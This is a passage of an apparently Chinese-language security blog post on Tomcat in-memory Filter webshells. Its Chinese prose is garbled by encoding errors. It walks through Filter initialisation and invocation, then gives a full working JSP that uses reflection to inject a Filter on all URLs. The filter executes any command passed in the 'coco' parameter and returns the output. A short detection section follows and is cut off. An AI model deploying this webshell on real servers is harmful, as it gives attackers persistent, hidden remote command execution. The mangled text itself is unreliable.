è½½Filteré“¾çš„ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹å›¾æ‰€ç¤º:<br><img src="/2022/04/14/memory-shell-1/tomcat-2.png"><br>é¦–å…ˆé€šè¿‡éå†ä»filterDefsä¸­è·å–keyå’Œvalueï¼Œå°†valueå°è£…ä¸º<code>ApplicationFilterConfig</code>å¯¹è±¡æ”¾å…¥<code>filterConfigs</code>å˜é‡ä¸­ã€‚<br>ç„¶ååœ¨<code>StandardContext</code>çš„addæ–¹æ³•ä¸‹æ–­ç‚¹ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-3.png"></p><p>Tomcatä¼šå…ˆåœ¨<code>ContextConfig.java</code>é‡Œé¢ä»<code>web.xml</code>è¯»å–å·²å®šä¹‰çš„Filterï¼Œç„¶ååŠ å…¥åˆ°<code>StandardContext</code>çš„å®ä¾‹åŒ–<code>context</code>é‡Œé¢ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-4.png"><br>ä¸Šé¢çš„ä¸¤ä¸ªæ–¹æ³•éƒ½åœ¨<code>StandardContext</code>é‡Œé¢ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-5.png"></p><p>æ¥ç€æ˜¯<code>org.apache.catalina.core.StandardContext#filterStart</code>æ ¹æ®å·²æœ‰çš„<code>filterDefs</code>ï¼Œéå†ä¹‹åå­˜å‚¨åˆ°<code>filterConfigs</code>é‡Œé¢ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-6.png"></p><p>ç»è¿‡ä¸Šé¢å‡ ä¸ªæ­¥éª¤çš„å¤„ç†ï¼Œtomcatå¯åŠ¨åˆå§‹åŒ–å®Œæˆï¼ŒæŠŠweb.xmlé‡Œé¢çš„FilteråŒ…è£…å¥½ä¹‹åæ”¾åœ¨äº†<code>StandardContext</code>ã€‚<br>æ€»ç»“æ¥è¯´æ˜¯è¿™å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li>æˆ‘ä»¬åœ¨ä»£ç é‡Œé¢å®šä¹‰å¥½Filterçš„å¤„ç†é€»è¾‘</li><li>Tomcatæ ¹æ®web.xmlçš„é…ç½®åŒ…è£…æˆFilterDefå’ŒFilterMapï¼Œåˆ†åˆ«æ·»åŠ åˆ°filterDefså’ŒfilterMapsï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡çš„å®šä¹‰éƒ½åœ¨<code>org.apache.tomcat.util.descriptor.web</code>åŒ…é‡Œé¢</li><li>éå†<code>filterDefs</code>å¯¹è±¡ä½¿ç”¨<code>ApplicationFilterConfig</code>å¯¹valueè¿›è¡Œå°è£…ï¼Œå°è£…ä¹‹åçš„å¯¹è±¡æ”¾å…¥<code>filterConfigs</code>ä¸­</li><li>è¿™ä¸ªæ—¶å€™åœ¨<code>StandardContext</code>é‡Œé¢æœ‰ä¸‰ç§å¯¹è±¡åˆå§‹åŒ–å®Œæˆï¼š <code>FilterDefs</code>ã€<code>Filterconfigs</code>ã€<code>FilterMaps</code></li></ol><p> PS: å†è¿™ä¸ªé˜¶æ®µTomcatä¼šè¿è¡ŒFilteré‡Œé¢çš„ä»£ç </p><h3 id="Filterçš„è¿è¡Œé€»è¾‘"><a href="#Filterçš„è¿è¡Œé€»è¾‘" class="headerlink" title="Filterçš„è¿è¡Œé€»è¾‘"></a>Filterçš„è¿è¡Œé€»è¾‘</h3><p>ä»¥ä¸Šæ˜¯Tomcatå¯åŠ¨è¿‡ç¨‹ï¼Œå›åˆ°ä¸Šé¢è®²çš„tomcatå®¹å™¨ç»„ä»¶å…³ç³»å›¾ï¼Œ åœ¨å®¹å™¨ç»„ä»¶ç»“æ„ä¸­æœ€åº•å±‚çš„æ˜¯<code>org.apache.catalina.core.StandardWrapper</code>ï¼Œåœ¨å¯¹åº”çš„æºä»£ç é‡Œé¢å¯ä»¥çœ‹åˆ°æ„é€ å‡½æ•°ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * Create a new StandardWrapper component with the default basic Valve. */</span><span class="token keyword">public</span> <span class="token class-name">StandardWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    swValve<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StandardWrapperValve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pipeline<span class="token punctuation">.</span><span class="token function">setBasic</span><span class="token punctuation">(</span>swValve<span class="token punctuation">)</span><span class="token punctuation">;</span>    broadcaster <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NotificationBroadcasterSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>é‡Œé¢è°ƒç”¨äº†Filterç›¸å…³çš„é€»è¾‘ä»£ç ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-7.png"><br>æ­¤æ—¶å‘èµ·ä¸€ä¸ªGetè¯·æ±‚ï¼Œæ‰“æ–­ç‚¹è·Ÿè¿›<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-8.png"><br>åˆ°æœ€åè¿”å›äº†filterChainså¯¹è±¡ï¼Œæ¥ç€è¿”å›æ‰§è¡Œ<code>filterChain.doFilter(request.getRequest(), response.getResponse());</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-9.png"></p><p>è·Ÿè¿›ä¹‹åä¼šè¿›å…¥åˆ°<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-10.png"></p><p>è·Ÿè¿›ä¹‹åè¿›å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„Filteré€»è¾‘é‡Œé¢å»ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-11.png"></p><p>æ¥è‡ªå®½å­—èŠ‚å¸ˆå‚…çš„æ€»ç»“å›¾ï¼š<br><img src="/2022/04/14/memory-shell-1/filter.png"></p><p>æ¥è‡ª<a href="http://wjlshare.com/archives/1529">å¤§æœ¨å¤´å¸ˆå‚…</a>çš„æ€»ç»“:</p><blockquote><ol><li>æ ¹æ®è¯·æ±‚çš„URLä»FilterMapsä¸­æ‰¾å‡ºä¸ä¹‹URLå¯¹åº”çš„Filteråç§°</li><li>æ ¹æ®Filteråç§°å»FilterConfigsä¸­å¯»æ‰¾å¯¹åº”åç§°çš„FilterConfig</li><li>æ‰¾åˆ°å¯¹åº”çš„FilterConfigä¹‹åæ·»åŠ åˆ° FilterChainä¸­ï¼Œå¹¶ä¸”è¿”å›FilterChain</li><li>filterChainä¸­è°ƒç”¨ internalDoFilteréå†è·å– chain ä¸­çš„ FilterConfig ï¼Œç„¶åä»FilterConfigä¸­è·å–Filterï¼Œç„¶åè°ƒç”¨Filterçš„doFilteræ–¹æ³•</li></ol></blockquote><p>è‡³æ­¤Filterçš„å¤„ç†æµç¨‹åˆ†æå®Œæˆï¼Œä¸»è¦åˆ†ä¸¤ä¸ªå¤§éƒ¨åˆ†ï¼ŒFilterçš„åˆå§‹åŒ–å’ŒFilterçš„è¿è¡Œé€»è¾‘ï¼Œå¦‚æœè¦åœ¨tomcaté‡Œé¢æ’å…¥Filterç±»å‹çš„æœ¨é©¬ï¼Œé¦–å…ˆéœ€è¦åœ¨ä»£ç é‡Œé¢å®ŒæˆFilteråˆå§‹åŒ–çš„æµç¨‹ï¼š</p><ol><li>åˆ›å»ºæ¶æ„Filter</li><li>ä½¿ç”¨FilterDefå¯¹FilteråŒ…è£…</li><li>å°†FilterDefåŠ å…¥åˆ°<code>FilterDefs</code>ï¼Œéå†<code>FilterDefs</code>åŒ…è£…ä¸º<code>FilterConfigs</code></li><li>åˆ›å»ºFilterMapï¼Œå°†Filterå’Œurlpatternå¯¹åº”ï¼Œå­˜æ”¾åˆ°<code>filterMaps</code></li><li>æŠŠåˆ›å»ºçš„<code>FilterDefs</code>ã€<code>Filterconfigs</code>ã€<code>FilterMaps</code>æ”¾åˆ°<code>StandardContext</code></li></ol><h2 id="åˆ›å»ºå†…å­˜é©¬"><a href="#åˆ›å»ºå†…å­˜é©¬" class="headerlink" title="åˆ›å»ºå†…å­˜é©¬"></a>åˆ›å»ºå†…å­˜é©¬</h2><p>ä¸ºäº†è·å–åˆ°<code>StandardContext</code>å¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦å…ˆææ¸…æ¥šè¿™ä¸ªå¯¹è±¡åœ¨æ•´Tomcaté‡Œé¢çš„ç»“æ„ä½ç½®ï¼š<br><code>StandardContext</code> â€“&gt; <code>ApplicationContext</code> â€“&gt; <code>ApplicationContextFacade</code></p><p>ä»æœ€ä¸Šå±‚å¼€å§‹åœ¨<code>org.apache.catalina.core.ApplicationContextFacade</code>å¯ä»¥æ‰¾åˆ°<code>ApplicationContext</code>:<br><img src="/2022/04/14/memory-shell-1/context-1.png"><br>æ ¹æ®å­¦åˆ°çš„åå°„åŸç†å’Œç½‘ä¸Šå¤§éƒ¨åˆ†Filterç±»å‹çš„å†…å­˜é©¬ï¼Œè°ƒè¯•å¦‚ä¸‹çš„ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>  <span class="token class-name">String</span> filterName <span class="token operator">=</span> <span class="token string">"coco"</span><span class="token punctuation">;</span>  <span class="token comment">//è·å–ApplicationContextFadeå¯¹è±¡ï¼ŒApplicationContextFadeæ˜¯ServletContextçš„å®ç°ï¼Œæ‰€ä»¥å…¶å®æ˜¯ServletContextå¯¹è±¡</span>  <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Field</span> appctx <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    appctx <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä»ApplicationContextFadeè·å–contextï¼Œè¿™é‡Œcontextæ˜¯æŒ‡ApplicationContext</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  appctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å–ApplicationContext</span>  out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€å¼€å§‹çš„ä»£ç æ˜¯<code>ServletContext servletContext = request.getSession().getServletContext();</code>ï¼Œå¦‚æœçœ‹äº†<code>org.apache.catalina.core.ApplicationContextFacade</code>å°±æ˜ç™½è¿™é‡Œæ˜¯ä¸€ä¸ª<code>servletContext</code>å¯¹è±¡çš„å®ç°ï¼Œæ‰€ä»¥ä½¿ç”¨<code>servletContext</code>æ¥è¡¨ç¤ºï¼Œæ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡åå°„è·å–<code>ApplicationContextFacade</code>çš„ç§æœ‰å˜é‡<code>context</code>ï¼Œå®é™…ä¸Šå°±æ˜¯<code>ApplicationContext</code>ï¼Œç„¶ååŒæ ·çš„æ–¹æ³•å»<code>ApplicationContext</code>é€šè¿‡åå°„è·å–<code>StandardContext</code>ï¼š<br><img src="/2022/04/14/memory-shell-1/context-2.png"></p><p>å®Œæ•´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.StandardContext"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.IOException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Scanner"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterDef"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.core.ApplicationFilterConfig"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Constructor"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"org.apache.catalina.Context"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.util.Map"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token comment">//è·å–ApplicationContextFadeå¯¹è±¡ï¼ŒApplicationContextFadeæ˜¯ServletContextçš„å®ç°ï¼Œæ‰€ä»¥å…¶å®æ˜¯ServletContextå¯¹è±¡</span>  <span class="token class-name">ServletContext</span> servletContext <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Field</span> appctx <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    appctx <span class="token operator">=</span> servletContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ä»ApplicationContextFadeè·å–contextï¼Œè¿™é‡Œcontextæ˜¯æŒ‡ApplicationContext</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchFieldException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  appctx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationContext</span><span class="token punctuation">)</span> appctx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å–ApplicationContext</span>  <span class="token class-name">Field</span> standCtx <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standCtx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span> standCtx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>applicationContext<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Filter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HttpServletRequest</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> servletRequest<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"coco"</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"coco"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Scanner</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">String</span> output <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>          servletResponse<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">//æŠŠåˆ›å»ºå¥½çš„filteråŒ…è£…ä¸ºFilterDefå¯¹è±¡</span>  <span class="token class-name">String</span> filterName <span class="token operator">=</span> <span class="token string">"coco"</span><span class="token punctuation">;</span>  <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>filterName<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//è°ƒç”¨addFilterDefåŠ å…¥åˆ°filterDefs</span>  <span class="token comment">//åˆ›å»ºFilterMapå¹¶ä¸”åŠ å…¥åˆ°filterMaps</span>  <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span>filterName<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//ä»standardContextè·å–filterConfigså¯¹è±¡</span>  <span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//åˆ©ç”¨åå°„åˆ›å»ºfilterConfig</span>  <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span> filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>  filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>filterName<span class="token punctuation">,</span>filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>  out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å†…å­˜é©¬çš„æ’æŸ¥"><a href="#å†…å­˜é©¬çš„æ’æŸ¥" class="headerlink" title="å†…å­˜é©¬çš„æ’æŸ¥"></a>å†…å­˜é©¬çš„æ’æŸ¥</h2><p>å‚è€ƒå¤©ä¸‹å¤§æœ¨å¤´å¸ˆå‚…ï¼Œä¸»è¦æœ‰ä¸¤ç§æ’æŸ¥æ–¹å¼ï¼š</p><h4 id="é‡‡ç”¨å­—èŠ‚ç çš„æ–¹å¼"><a href="#é‡‡ç”¨å­—èŠ‚ç çš„æ–¹å¼" class="headerlink" title="é‡‡ç”¨å­—èŠ‚ç çš„æ–¹å¼"></a>é‡‡ç”¨å­—èŠ‚ç çš„æ–¹å¼</h4><ol><li><a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></li><li><a 